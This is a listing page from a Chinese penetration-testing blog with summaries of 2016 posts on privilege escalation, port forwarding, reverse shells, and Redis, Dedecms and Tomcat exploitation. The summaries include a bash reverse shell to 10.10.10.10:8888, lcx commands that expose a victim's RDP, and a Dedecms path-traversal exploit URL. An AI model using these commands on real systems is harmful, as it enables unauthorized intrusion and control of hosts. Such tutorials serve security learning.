<!doctype html><html lang=en><head><meta name=generator content="Hugo 0.140.2"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>Reber's Blog</title>
<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.cn/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.cn/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
|
<a href=/posts/><b>Posts</b></a>
|
<a href=/categories/><b>Categories</b></a>
|
<a href=/tags/><b>Tags</b></a>
|
<a href=/about/><b>About</b></a>
|
<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/>Linux 下系统漏洞提权</a></h1><div class=post-meta><time>2016-08-09</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><h3 id=0x00-linux下的提权>0x00 Linux下的提权</h3><p>Linux下一般都是系统漏洞提权，分为以下几个步骤：</p><pre tabindex=0><code>1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
</code></pre><h3 id=0x01-提权>0x01 提权</h3><ul><li>获取系统版本号<ul><li>获取发行版本<ul><li>cat /etc/*-release</li><li>cat /etc/issue</li><li>cat /etc/lsb-release</li><li>cat /etc/redhat-release</li></ul></li><li>获取内核版本<ul><li>cat /proc/version</li><li>uname -a</li><li>uname -mrs</li><li>rpm -q kernel</li><li>dmesg | grep Linux</li><li>ls /boot | grep vmlinuz</li></ul></li></ul></li><li>根据系统版本号找对应exp<ul><li><a href=http://www.exploit-db.com>http://www.exploit-db.com</a></li><li><a href=http://1337day.com>http://1337day.com</a></li><li><a href=http://www.securiteam.com>http://www.securiteam.com</a></li><li><a href=http://www.securityfocus.com>http://www.securityfocus.com</a></li><li><a href=http://www.exploitsearch.net>http://www.exploitsearch.net</a></li><li><a href=http://metasploit.com/modules>http://metasploit.com/modules</a></li><li><a href=http://securityreason.com>http://securityreason.com</a></li><li><a href=http://seclists.org/fulldisclosure>http://seclists.org/fulldisclosure</a></li><li><a href=http://www.google.com>http://www.google.com</a></li></ul></li><li>反弹shell<ul><li>本地：<code>nc -l -p 8888</code></li><li>目标机器：<code>/bin/bash -i >& /dev/tcp/10.10.10.10/8888 0>&amp;1</code></li></ul></li><li>尝试利用</li></ul><h3 id=0x02-实例>0x02 实例</h3><ul><li><p>得到系统版本号
<img src=/img/post/privilge_escalation_linux_get_sys_version.png alt=得到系统版本号></p><a href=https://wyb0.cn/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/port-forwarding/>端口转发</a></h1><div class=post-meta><time>2016-08-08</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91>端口转发</a>)</div><div class=summary-body><p><h3 id=0x00-应用场景>0x00 应用场景</h3><ul><li>内网IP的80端口通过端口映射到了外网IP的80端口上</li><li>内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中</li></ul><h3 id=0x01-判断web是否为内网>0x01 判断Web是否为内网</h3><ul><li>向ping域名，查看IP是外网</li><li>用webshell查看ip却是内网IP</li></ul><h3 id=0x02-端口转发工具>0x02 端口转发工具</h3><ul><li>lcx</li><li>htran</li><li><a href=http://rootkiter.com/EarthWorm/?_blank>EarthWorm</a></li><li>netsh</li><li><a href=https://github.com/sensepost/reGeorg?_blank>reGeorg</a></li><li>meterpreter porfwd</li></ul><h3 id=0x03-lcx端口转发>0x03 lcx端口转发</h3><ul><li>Hacker：lcx.exe -listen 500 8888</li><li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389</li><li>Hacker：cmd mstsc hacker_ip:500</li></ul><p><img src=/img/post/privilge_escalation_win_hacker_run_lcx.png alt=hacker运行lcx>
<img src=/img/post/privilge_escalation_win_vimctim_run_lcx.png alt=vimctim端运行lcx>
<img src=/img/post/privilge_escalation_win_hacker_remote_conn.png alt=hacker远程连接>
<img src=/img/post/privilge_escalation_win_hacker_remote_conn_success.png alt=hacker远程连接成功></p><a href=https://wyb0.cn/posts/2016/port-forwarding/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/export-host-password-and-open-3389/>导出 Windows 主机密码与开启 3389</a></h1><div class=post-meta><time>2016-08-08</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><h3 id=0x00-导出主机密码hash>0x00 导出主机密码hash</h3><ul><li><p>关于Windows的hash</p><ul><li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash</li><li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值</li><li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM</li></ul></li><li><p>导出hash条件</p><a href=https://wyb0.cn/posts/2016/export-host-password-and-open-3389/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/windows-use-third-party-server-elevate-privileges/>Windows 下第三方服务提权</a></h1><div class=post-meta><time>2016-08-07</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><h3 id=0x00--mssql提权>0x00 MSSQL提权</h3><p>MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权<br>提权条件：数据库账号是DBA权限</p><a href=https://wyb0.cn/posts/2016/windows-use-third-party-server-elevate-privileges/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/>Windows 下系统漏洞提权</a></h1><div class=post-meta><time>2016-08-07</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><p>提权是在已经getshell但是权限不大的前提下做的</p><h3 id=0x00-查看基本信息>0x00 查看基本信息</h3><p><img src=/img/post/privilge_escalation_win_view_msg1.png alt=Windows系统漏洞提权-查看基本信息1></p><p><img src=/img/post/privilge_escalation_win_view_msg2.png alt=Windows系统漏洞提权-查看基本信息2></p><h3 id=0x01-使用cmd执行命令>0x01 使用cmd执行命令</h3><ul><li><p>尝试使用cmd执行命令
<img src=/img/post/privilge_escalation_win_try_use_cmd.png alt=Windows系统漏洞提权-尝试使用cmd执行命令></p></li><li><p>找可写目录
<img src=/img/post/privilge_escalation_win_find_wirteable_dir.png alt=Windows系统漏洞提权-找可写目录></p><a href=https://wyb0.cn/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/reverse-shell/>反弹 shell 小结</a></h1><div class=post-meta><time>2016-08-06</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/shell>shell</a>)</div><div class=summary-body><p><p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p><a href=https://wyb0.cn/posts/2016/reverse-shell/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/dedecms-remote-write-file-vulnerability/>Dedecms 远程写文件漏洞</a></h1><div class=post-meta><time>2016-08-05</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/dedecms>dedecms</a>)</div><div class=summary-body><p><h3 id=0x00-关于漏洞>0x00 关于漏洞</h3><pre tabindex=0><code>Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞
</code></pre><h3 id=0x01-利用条件>0x01 利用条件</h3><pre tabindex=0><code>dedecms版本为20150618之前的  
安装目录install下的index.php.bak文件未被删除
</code></pre><h3 id=0x02-实例>0x02 实例</h3><ul><li><p>查看cms版本
<img src=/img/post/dedecms_before_20150617_check_version.png alt=查看织梦cms版本></p></li><li><p>清空文件</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>www</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xxxx</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>install</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>.</span><span style=color:#a6e22e>bak</span><span style=color:#f92672>?</span><span style=color:#a6e22e>step</span><span style=color:#f92672>=</span><span style=color:#ae81ff>11</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>insLockfile</span><span style=color:#f92672>=</span><span style=color:#a6e22e>a</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>s_lang</span><span style=color:#f92672>=</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>install_demo_name</span><span style=color:#f92672>=../</span><span style=color:#a6e22e>data</span><span style=color:#f92672>/</span><span style=color:#a6e22e>admin</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config_update</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>访问上面的链接会使服务器到http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>updatenew</span><span style=color:#f92672>.</span><span style=color:#a6e22e>dedecms</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>base</span><span style=color:#f92672>-</span><span style=color:#a6e22e>v57</span><span style=color:#f92672>/</span><span style=color:#a6e22e>dedecms</span><span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>demodata</span><span style=color:#f92672>.</span><span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>txt中读取内容写入到config_update</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php，但demodata</span><span style=color:#f92672>.</span><span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>txt为空，</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>所以就清空了config_update</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span></code></pre></div><p><img src=/img/post/dedecms_before_20150617_clear_config_update.png alt=清空文件config_update></p><a href=https://wyb0.cn/posts/2016/dedecms-remote-write-file-vulnerability/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/redis-unauthorized-access/>Redis 未授权访问漏洞</a></h1><div class=post-meta><time>2016-08-04</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/redis>redis</a>,<a href=/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E>逻辑漏洞</a>)</div><div class=summary-body><p><h3 id=0x00-redis的未授权访问>0x00 Redis的未授权访问</h3><p>若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。</p><p>若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。</p><a href=https://wyb0.cn/posts/2016/redis-unauthorized-access/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/redis-bisis-use/>一次存储型 XSS 利用实例</a></h1><div class=post-meta><time>2016-08-03</time>
[<a href=/categories/Server>Server</a>,<a href=/categories/Database>Database</a>](<a href=/tags/server>server</a>,<a href=/tags/redis>redis</a>)</div><div class=summary-body><p><h3 id=0x00-关于redis>0x00 关于Redis</h3><pre tabindex=0><code>Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库，
实现了master-slave(主从)同步,数据都是缓存在内存中的,所以可高速读写,但存储成本较高,
不适合做海量数据存储。
</code></pre><h3 id=0x01-安装>0x01 安装</h3><ul><li>Linux下安装Redis
可在http://download.redis.io/releases/ 下载</li></ul><pre tabindex=0><code>$ cd /opt
$ wget http://download.redis.io/releases/redis-3.2.3.tar.gz
$ tar -zxvf redis-3.2.3.tar.gz
$ cd redis-3.2.3
$ make
$ make install
</code></pre><ul><li>Windows下安装Redis
下载：<a href=https://github.com/MSOpenTech/redis/releases target=_blank>点此下载</a></li></ul><p>安装后添加环境变量</p><a href=https://wyb0.cn/posts/2016/redis-bisis-use/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.cn/posts/2016/tomcat-deploy-war-package-to-getshell/>Tomcat 部署 War 包 getshell</a></h1><div class=post-meta><time>2016-08-02</time>
[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/getshell>getshell</a>)</div><div class=summary-body><p><h3 id=0x00-关于-war-包>0x00 关于 War 包</h3><pre tabindex=0><code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
</code></pre><h3 id=0x01-上传-war-包-getshell>0x01 上传 War 包 GetShell</h3><ul><li><p>找到后台猜密码然后登录
<img src=/img/post/tomcat_vul_background.png alt=70>
<img src=/img/post/tomcat_vul_login.png alt=40>
<img src=/img/post/tomcat_vul_war_login_success.png alt=30></p><a href=https://wyb0.cn/posts/2016/tomcat-deploy-war-package-to-getshell/>more...</a></p></div></article><div><a href=/page/9/>Previous Page</a>
10 of 18
<a href=/page/11/>Next Page</a></div></main></div><footer><hr><p id=social>Find me around the web:
<a href=https://github.com/reber0?_blank>GitHub</a>
•
<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
<a href=https://wyb0.cn/><strong>Reber</strong></a>.
Built with
<a href=http://www.gohugo.io/>Hugo</a>,
based on the theme
<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>